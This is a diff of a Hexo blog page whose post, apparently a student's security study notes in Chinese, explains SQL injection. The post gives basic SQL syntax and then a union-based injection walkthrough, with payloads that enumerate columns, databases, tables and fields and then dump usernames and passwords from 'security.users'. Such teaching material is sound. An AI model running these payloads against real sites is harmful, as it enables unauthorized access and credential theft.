@@ -1,183 +1,386 @@
+<!DOCTYPE html>
+<html 
+	lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		
+<link rel="stylesheet" href="/css/layout.css">
 
+		
+		<title> Web -  Hexo</title>
+		<!-- <link rel="stylesheet" href="https://unpkg.com/mdui@1.0.2/dist/css/mdui.min.css" /> -->
+		<!-- <script src="https://unpkg.com/mdui@1.0.2/dist/js/mdui.min.js"></script> -->
+		
+<link rel="stylesheet" href="/lib/mdui/mdui.min.css">
 
-  <!DOCTYPE html>
-  <html lang="en">
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="renderer" content="webkit">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <meta name="description" content=网安小菜鸡的个人学习博客...... >
-  <meta name="keywords" content=hexo,theme,MiHoYo >
+		
+<script src="/lib/mdui/mdui.min.js"></script>
 
-  <head>
-    <title>
-      Web [ Hexo ]
-    </title>
-  <meta name="generator" content="Hexo 7.1.1"></head>
+		<!-- lazyload -->
+		
+<script src="/lib/lazysizes.js"></script>
 
-  <body>
+		<!-- smooth-scrolling -->
+		
+<script src="/lib/smooth-scrolling.js"></script>
 
-    <link rel="stylesheet" href="/css/header.css">
-<div class="header">
-  <div class="logo">
-    <span class="pull-left">
-      <a id="site-name" href="/">
-        syl&#39;s blog
-      </a>
-    </span>
-  </div>
-  <ul class="nav-list">
-    
-      <li>
-        <a href="/">
-          首页
-        </a>
-      </li>
-      
-      <li>
-        <a href="/about">
-          关于
-        </a>
-      </li>
-      
-  </ul>
+		<!-- highlight -->
+		
+<link rel="stylesheet" href="/lib/highlight/atom-one-dark.min.css">
+
+		
+<script src="/lib/highlight/highlight.min.js"></script>
+
+		<!-- 预置 kiraicon -->
+		
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css">
+
+		
+		<link
+			rel="shortcut icon"
+			href="https://c-ssl.duitang.com/uploads/blog/202307/21/B8SV6nAYtl0l1Lq.png"
+			type="image/png"
+		/>
+		
+<link rel="stylesheet" href="/deps/css/APlayer.min.css">
+
+		
+		
+<script src="/deps/js/APlayer.min.js"></script>
+<script src="/deps/js/Meting.min.js"></script>
+
+	<meta name="generator" content="Hexo 7.1.1"></head>
+
+	<body>
+		<div
+			class="kira-background"
+			style="background-image: url('https://i0.hdslb.com/bfs/article/f149840d85eabcaee56e1bd91dfb9026b7b24550.jpg@1256w_1256h_!web-article-pic.avif')"
+		></div>
+		<div class="kira-header">
+    <a
+        class="kira-drawer-button mdui-ripple"
+        title="导航栏"
+        onclick="document.querySelector('.kira-sidebar-modal').classList.add('show');document.querySelector('.kira-sidebar#sidebar').classList.add('show');"
+    >
+        <i class="kirafont icon-menu"></i>
+    </a>
+    <a href="/" title="Hexo">
+        <img
+			src="https://i0.hdslb.com/bfs/article/bba0492b82e2b25e94ed955693d3ac4791611f31.png@1256w_708h_!web-article-pic.avif"
+			alt="John Doe"
+		/>
+    </a>
+</div>
+		<div class="kira-body">
+			<div class="kira-sidebar" id="sidebar">
+	<div class="kira-avatar mdui-ripple">
+		<a target="_blank" rel="noopener" href="https://i0.hdslb.com/bfs/article/bba0492b82e2b25e94ed955693d3ac4791611f31.png@1256w_708h_!web-article-pic.avif" title="John Doe">
+			<img
+				src="https://i0.hdslb.com/bfs/article/bba0492b82e2b25e94ed955693d3ac4791611f31.png@1256w_708h_!web-article-pic.avif"
+				alt="John Doe"
+			/>
+		</a>
+	</div>
+	<div class="kira-count">
+		<div><span>文章</span>5</div>
+		<div><span>标签</span>0</div>
+		<div><span>分类</span>0</div>
+	</div>
+	<div class="kira-list">
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/"
+			title="回到首页"
+		>
+			<i
+				class="kirafont
+					
+						icon-home
+					"
+			></i>
+			<div class="kira-list-item-content">
+				回到首页
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/archive.html"
+			title="文章归档"
+		>
+			<i
+				class="kirafont
+					
+						icon-container
+					"
+			></i>
+			<div class="kira-list-item-content">
+				文章归档
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/about.html"
+			title="关于本人"
+		>
+			<i
+				class="kirafont
+					
+						icon-user
+					"
+			></i>
+			<div class="kira-list-item-content">
+				关于本人
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/friends.html"
+			title="我的朋友"
+		>
+			<i
+				class="kirafont
+					
+						icon-team
+					"
+			></i>
+			<div class="kira-list-item-content">
+				我的朋友
+			</div>
+		</a>
+		
+	</div>
+	<aside id="kira-sidebar">
+		
+			<div class="kira-widget-wrap">
+	<div class="kira-widget kira-social">
+		
+			<a
+				class="mdui-ripple"
+				href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3244634309&website=www.oicqzone.com"
+				target="_blank"
+				mdui-tooltip="{content: 'QQ'}"
+				style="color: rgb(49, 174, 255); background-color: rgba(49, 174, 255, .1);"
+			>
+				<i
+					class="kirafont
+					
+						icon-QQ
+					"
+				></i>
+			</a>
+		
+	</div>
 </div>
 
-      <!--<link rel="stylesheet" href="/css/top-header.css">
-<div id="top-bar" class="fixed">
+		
+			
+		
+			
 
-  <a class="goto-top" href="#"></a>
-  <ul class="bar-list bar-list-1">
-    
-      <li>
-        <p>
-          <a href="/">
-            <text class="bar-text bar-p1">
-              首页
-            </text>
-            <text class="bar-text bar-p2"></text>
-          </a>
-          <text class="bar-p3">/</text>
-        </p>
-      </li>
-      
-      <li>
-        <p>
-          <a href="/about">
-            <text class="bar-text bar-p1">
-              关于
-            </text>
-            <text class="bar-text bar-p2"></text>
-          </a>
-          <text class="bar-p3">/</text>
-        </p>
-      </li>
-      
-  </ul>
-</div>-->
+		
+			
+	<div class="kira-widget-wrap">
+		<h3 class="kira-widget-title">
+			Archive
+		</h3>
+		<div class="kira-widget">
+			<ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">5</span></li></ul>
+		</div>
+	</div>
 
-        <div id="content-outer">
-          <div class="content-inner">
-            <link rel="stylesheet" href="/css/post.css">
-<div class="posts">
-  <a href="/index.html"><i class="fa fa-home
-replay-btn" aria-hidden="true"></i></a>
-  <div class="post-title">
-    <p>
-      Web
-    </p>
-    <hr>
-  </div>
-  <div class="post-content">
-    <h1 id="基础漏洞："><a href="#基础漏洞：" class="headerlink" title="基础漏洞："></a>基础漏洞：</h1><h3 id="1-SQL注入："><a href="#1-SQL注入：" class="headerlink" title="1.SQL注入："></a>1.SQL注入：</h3><p><strong>实现原理</strong>：脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面展示），</p>
+
+		
+	</aside>
+	<div class="kira-copyright">
+		&copy; 2024
+		<a href="/">John Doe</a>
+		Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> &
+		<a href="https://github.com/ch1ny/kira-hexo/" target="_blank">Kira-Hexo</a>
+		<br />
+		
+		
+	</div>
+</div>
+<div
+	class="kira-sidebar-modal"
+	id="sidebar-modal"
+	onclick="(function(self) {
+		self.classList.remove('show');
+		document.querySelector('.kira-sidebar.show#sidebar').classList.remove('show');
+	})(this)"
+></div>
+			<div class="kira-content">
+				<div id="kira-top-header"></div>
+				<div class="kira-main-content">
+					
+<link rel="stylesheet" href="/css/kira-image.css">
+
+
+<script src="/js/kira-image.js"></script>
+
+<div class="kira-image">
+    <div class="kira-image-modal">
+        <div class="kira-image-header">
+            <div class="kira-image-counter"></div>
+            <div class="kira-image-title"></div>
+            <div class="kira-image-operation">
+                <div class="kira-image-operation-button" id="kira-image-operation-button-zoom">
+                    <i class="kirafont icon-zoom-in"></i>
+                </div>
+                <div class="kira-image-operation-button" id="kira-image-operation-button-close">
+                    <i class="kirafont icon-close"></i>
+                </div>
+            </div>
+        </div>
+        <div class="kira-image-container">
+            <div class="kira-image-prev-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-left"></i>
+                </div>
+            </div>
+            <div class="kira-image-list">
+                <div class="kira-image-prev">
+                    <img />
+                </div>
+                <div class="kira-image-now">
+                    <img />
+                </div>
+                <div class="kira-image-next">
+                    <img />
+                </div>
+            </div>
+            <div class="kira-image-next-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-right"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+	
+<link rel="stylesheet" href="/css/kira-code-copy.css">
+
+	
+<script src="/js/kira-code-copy.js"></script>
+
+
+<div class="kira-post">
+	<article>
+		
+		<div
+			class="kira-post-cover"
+			style="padding-bottom: '56.25%'"
+		>
+			<img
+				data-src="https://i0.hdslb.com/bfs/article/f149840d85eabcaee56e1bd91dfb9026b7b24550.jpg@1256w_1256h_!web-article-pic.avif"
+				data-sizes="auto"
+				alt="Web"
+				class="lazyload kira-post-cover-image disabled-kira-image"
+			/>
+			<h1>Web</h1>
+		</div>
+		
+		<div class="kira-post-meta kira-rainbow" style="margin:10px 0!important;">
+			<a><i class="kirafont icon-calendar-fill"></i>2024年04月04日</a>
+			<a><i class="kirafont icon-edit-fill"></i>3.2k 字</a>
+			<a><i class="kirafont icon-time-circle-fill"></i>大概 14 分钟</a>
+		</div>
+		<h1><span id="基础漏洞">基础漏洞：</span></h1><h3><span id="1sql注入">1.SQL注入：</span></h3><p><strong>实现原理</strong>：脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面展示），</p>
 <p>将定义的SQL语句 进行查询数据时，其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（例如数据库中的敏感数据，如管理员的账号密码等等）。这过程就叫做SQL注入漏洞。</p>
 <p><strong>注入条件：</strong></p>
 <ul>
 <li>用户可以控制数据的输入。</li>
 <li>原本要运行的代码拼接了用户的输入并运行。</li>
 </ul>
-<h4 id="常见SQL注入语句："><a href="#常见SQL注入语句：" class="headerlink" title="常见SQL注入语句："></a>常见SQL注入语句：</h4><p><strong>数据查询语句（SELECT）</strong>：用于从数据库中检索数据。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4><span id="常见sql注入语句">常见SQL注入语句：</span></h4><p><strong>数据查询语句（SELECT）</strong>：用于从数据库中检索数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2 <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>;<br><br></code></pre></td></tr></table></figure>
 
 <p><strong>数据插入语句（INSERT）</strong>：用于向数据库中插入新数据。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2) <span class="keyword">VALUES</span> (value1, value2);</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (column1, column2) <span class="hljs-keyword">VALUES</span> (value1, value2);<br></code></pre></td></tr></table></figure>
 
 <p><strong>数据更新语句（UPDATE）</strong>：用于更新数据库中的现有数据。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> column1 <span class="operator">=</span> value1, column2 <span class="operator">=</span> value2 <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> table_name <span class="hljs-keyword">SET</span> column1 <span class="hljs-operator">=</span> value1, column2 <span class="hljs-operator">=</span> value2 <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>;<br><br></code></pre></td></tr></table></figure>
 
 <p><strong>数据删除语句（DELETE）</strong>：用于从数据库中删除数据。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>;<br><br></code></pre></td></tr></table></figure>
 
 <p><strong>创建表语句（CREATE TABLE）</strong>：用于创建新的数据表。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> table_name (<br>    column1 datatype,<br>    column2 datatype,<br>    ...<br>);<br><br></code></pre></td></tr></table></figure>
 
 <p><strong>修改表结构语句（ALTER TABLE）</strong>：用于修改已有数据表的结构。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ADD</span> column_name datatype;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> table_name <span class="hljs-keyword">ADD</span> column_name datatype;<br><br></code></pre></td></tr></table></figure>
 
 <p><strong>删除表语句（DROP TABLE）</strong>：用于删除数据表。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> table_name;<br><br></code></pre></td></tr></table></figure>
 
 <p><strong>授权语句（GRANT）</strong>：用于授权用户访问数据库或特定数据表的权限。****</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> permission <span class="keyword">ON</span> table_name <span class="keyword">TO</span> <span class="keyword">user</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">GRANT</span> permission <span class="hljs-keyword">ON</span> table_name <span class="hljs-keyword">TO</span> <span class="hljs-keyword">user</span>;<br><br></code></pre></td></tr></table></figure>
 
 <p><strong>撤销授权语句（REVOKE）</strong>：用于撤销用户对数据库或数据表的权限。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> permission <span class="keyword">ON</span> table_name <span class="keyword">FROM</span> <span class="keyword">user</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">REVOKE</span> permission <span class="hljs-keyword">ON</span> table_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span>;<br><br></code></pre></td></tr></table></figure>
 
 <p><strong>数据聚合函数</strong>：用于对数据进行聚合计算，如求和、平均值等。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(column_name) <span class="keyword">FROM</span> table_name;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(column_name) <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(column_name) <span class="hljs-keyword">FROM</span> table_name;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(column_name) <span class="hljs-keyword">FROM</span> table_name;<br></code></pre></td></tr></table></figure>
 
-<h2 id="有回显的sql注入方式："><a href="#有回显的sql注入方式：" class="headerlink" title="有回显的sql注入方式："></a>有回显的sql注入方式：</h2><h3 id="1-联合查询注入："><a href="#1-联合查询注入：" class="headerlink" title="1.联合查询注入："></a>1.联合查询注入：</h3><h4 id="UNION操作："><a href="#UNION操作：" class="headerlink" title="UNION操作："></a>UNION操作：</h4><p><code>UNION</code> 是一个 SQL 操作符，用于合并两个或多个 <code>SELECT</code> 语句的结果集并去除重复的行。</p>
+<h2><span id="有回显的sql注入方式">有回显的sql注入方式：</span></h2><h3><span id="1联合查询注入">1.联合查询注入：</span></h3><h4><span id="union操作">UNION操作：</span></h4><p><code>UNION</code> 是一个 SQL 操作符，用于合并两个或多个 <code>SELECT</code> 语句的结果集并去除重复的行。</p>
 <p>语法结构如下：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column1, column2 <span class="hljs-keyword">FROM</span> table1<br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> column1, column2 <span class="hljs-keyword">FROM</span> table2;<br></code></pre></td></tr></table></figure>
 
 <p>需要注意的是，<code>UNION</code> 操作符默认会去除重复的行。如果需要保留所有的行（包括重复的行），可以使用 <code>UNION ALL</code> 操作符。即在上述代码块的“union”后加 “ALL”。</p>
-<h4 id="注入流程："><a href="#注入流程：" class="headerlink" title="注入流程："></a>注入流程：</h4><p>依次判断类型，字段数，回显点，依次爆库名，表名，字段名，数据</p>
+<h4><span id="注入流程">注入流程：</span></h4><p>依次判断类型，字段数，回显点，依次爆库名，表名，字段名，数据</p>
 <p>判断类型：</p>
 <p>example：</p>
 <p>先在url界面输入id&#x3D;1，然后用单引号闭合，将单引号注释掉后发现恢复正常，说明输入的单引号与前面的id&#x3D;1形成一个闭合，就可判断注入类型为字符型，闭合方式为单引号。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d<span class="string">&#x27; and 1=1#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">d<span class="hljs-string">&#x27; and 1=1#</span><br></code></pre></td></tr></table></figure>
 
 <p>使用上面的代码，若返回正常，则判断为字符型注入点</p>
 <p><strong>判断字段数（有些题目不做要求，也叫做查询了多少列数据）：</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1 --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1 --+</span><br></code></pre></td></tr></table></figure>
 
 <p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们要对字段数进行判断</p>
 <p>使用 order by number输出第number列，不断的增加number地大小直到报错，此时的number-1就是字段数。</p>
 <p><strong>判断回显点：</strong></p>
 <p>使用语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">111</span>‘ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">111</span>‘ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 
 <p>查看到显示num1，num2。于是判断显示位为第num1个元素和第num2个元素。</p>
 <p>这里将id值改为111是为了让前面查询的语句为空，无显示，然后后面查询语句查询的元素显示出来。</p>
 <p>也可以用limit语法</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3 limit 1,1 --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3 limit 1,1 --+</span><br></code></pre></td></tr></table></figure>
 
 <p>而 limit num1，num2的作用为**从第num1行开始显示num2行内容</p>
 <p><strong>爆破库名：</strong></p>
 <p>比如第二三个显示位都可查询：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">111</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(database()) <span class="comment">--+</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">111</span>’ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(database()) <span class="hljs-comment">--+</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),3 --+</span><br></code></pre></td></tr></table></figure>
 
 <p><strong>爆破表名：</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">111</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(group_concat(table_name) frominformation_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>‘security’) <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">111</span>’ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(group_concat(table_name) frominformation_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>‘security’) <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
 
 <p>上面第一段代码即在第二行显示所用的表名，第二段是在第三行显示。</p>
 <p>information_schema是mysql自带的库，记录了该数据库<strong>所有的表名和字段名</strong>，里面有一个tables表，里面存有整个数据库的表名。我们要去查找的表，就是在这个库中去找。使用group_concat()函数将所有查询的表名连在一起成为一条数据。</p>
 <p><strong>爆破字段名：</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span> <span class="number">111</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> ‘security’ <span class="keyword">and</span> table_name <span class="operator">=</span> ‘users’ ) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span> <span class="hljs-number">111</span>’ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema <span class="hljs-operator">=</span> ‘security’ <span class="hljs-keyword">and</span> table_name <span class="hljs-operator">=</span> ‘users’ ) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 
 <p>数据库中，有一个information_schema库，里面有一个columns表，里面存有整个数据库的列名。我们要去查找的列，就是在这个库中去找。以上payload可解释为：查询数据库security下表users中的所有字段。</p>
 <p><strong>查找数据：</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,0x5c,password),3 from security.users --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(username,0x5c,password),3 from security.users --+</span><br></code></pre></td></tr></table></figure>
 
